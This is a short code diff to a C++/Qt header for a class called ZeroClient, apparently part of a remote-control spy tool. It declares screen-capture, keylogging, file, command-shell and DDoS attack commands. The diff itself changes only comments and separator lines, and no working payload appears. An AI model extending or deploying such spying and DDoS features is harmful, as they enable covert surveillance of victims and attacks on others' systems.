@@ -19,7 +19,7 @@ class ZeroClient : public QObject
     Q_OBJECT
 public:
     explicit ZeroClient(QTcpSocket *sock, QObject *parent = 0);
-
+    //-------------------------------------------------------------------------------
     // 服务端向客户端发送的指令(你觉得有需要你也可以增加自己的指令)
     const QByteArray CmdScreenSpy = "SCREEN_SPY";
     const QByteArray CmdKeyboardSpy = "KEYBOARD_SPY";
@@ -33,6 +33,7 @@ public:
 
     // 客户端向服务端发送的指令(你觉得有需要你也可以增加自己的指令)
     const QByteArray CmdLogin = "LOGIN";
+    //------------------------------------------------------------------------------
 
     // 分割符号和结束符号，比如登入命令:LOGIN<分割符>SYSTEM<分割符>Windows 7<分割符>USER_NAME<分割符>sumkee911<结束符号>
     const QByteArray CmdSplit = ";";
@@ -54,7 +55,7 @@ public:
     void sendKeyboardSpy(int port);
     void sendFileSpy(int port);
     void sendCmdSpy(int port);
-    //添加一个ddos攻击命令
+    //添加了一个ddos攻击命令
     void sendDdosSpy(int port);
 
 private:
